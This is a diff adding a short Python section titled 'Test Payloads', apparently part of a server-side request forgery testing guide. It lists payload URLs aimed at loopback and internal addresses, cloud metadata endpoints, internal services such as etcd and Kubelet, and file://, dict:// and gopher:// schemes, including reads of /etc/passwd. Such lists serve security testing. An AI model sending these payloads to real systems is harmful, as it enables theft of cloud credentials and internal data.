@@ -1,0 +1,46 @@
+Step 2: Test Payloads
+python
+
+# Basic SSRF test payloads
+basic_payloads = [
+    "http://127.0.0.1:80/",
+    "http://localhost:80/",
+    "http://0.0.0.0:80/",
+    "http://[::1]:80/",
+]
+
+# Internal IP ranges
+internal_ips = [
+    "http://10.0.0.1/",
+    "http://172.16.0.1/",
+    "http://192.168.1.1/",
+    "http://169.254.169.254/",
+]
+
+# Cloud metadata
+metadata_endpoints = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",
+    "http://100.100.100.200/latest/meta-data/",
+    "http://169.254.169.254/metadata/instance",
+]
+
+# Internal services
+internal_services = [
+    "http://localhost:8080/",
+    "http://localhost:3000/",
+    "http://localhost:5000/",
+    "http://localhost:8000/",
+    "http://localhost:9200/",  # Elasticsearch
+    "http://localhost:2379/",  # etcd
+    "http://localhost:10250/", # Kubelet
+]
+
+# Protocol tests
+protocol_tests = [
+    "file:///etc/passwd",
+    "file:///c:/windows/win.ini",
+    "dict://localhost:11211/",  # Memcached
+    "gopher://localhost:8080/_GET%20/",
+    "ftp://127.0.0.1/",
+]
